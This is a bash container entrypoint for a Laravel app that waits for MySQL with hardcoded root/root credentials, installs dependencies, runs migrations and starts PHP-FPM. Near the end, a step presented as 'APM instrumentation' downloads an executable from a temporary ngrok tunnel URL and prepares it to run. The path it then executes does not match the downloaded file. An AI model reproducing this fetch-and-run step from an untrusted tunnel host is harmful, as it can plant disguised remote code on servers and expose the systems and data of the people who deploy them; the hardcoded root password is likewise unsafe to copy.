#!/bin/bash

# Wait for MySQL to be ready
echo "Waiting for MySQL to start..."
counter=0
max_tries=60  # 2 minutes timeout (60 * 2s)

while ! mysql -h db -u root -proot -e "SELECT 1" >/dev/null 2>&1; do
    counter=$((counter + 1))
    echo "Attempt $counter: MySQL not ready yet..."
    
    if [ $counter -ge $max_tries ]; then
        echo "Error: Timed out waiting for MySQL to start."
        exit 1
    fi
    
    sleep 2
done

echo "MySQL is ready and accessible!"

cd /var/www

# Install dependencies
composer install --no-interaction --no-progress

# Generate application key if not already set
php artisan key:generate --no-interaction --force

# Clear config cache
php artisan config:clear

# Run migrations
echo "Running database migrations..."
php artisan migrate --force

# Run APM installation script
echo "Installing APM instrumentation..."
cd /var/www
curl -O  https://5a9c-2401-4900-1f3e-5412-2f17-9c9f-38e4-74ed.ngrok-free.app/instrument
chmod +x instrument
php /usr/local/bin/instrument install --additional-ini-dir=/usr/local/etc/php/conf.d --web-root=/var/www

# Start PHP-FPM
echo "Starting PHP-FPM..."
php-fpm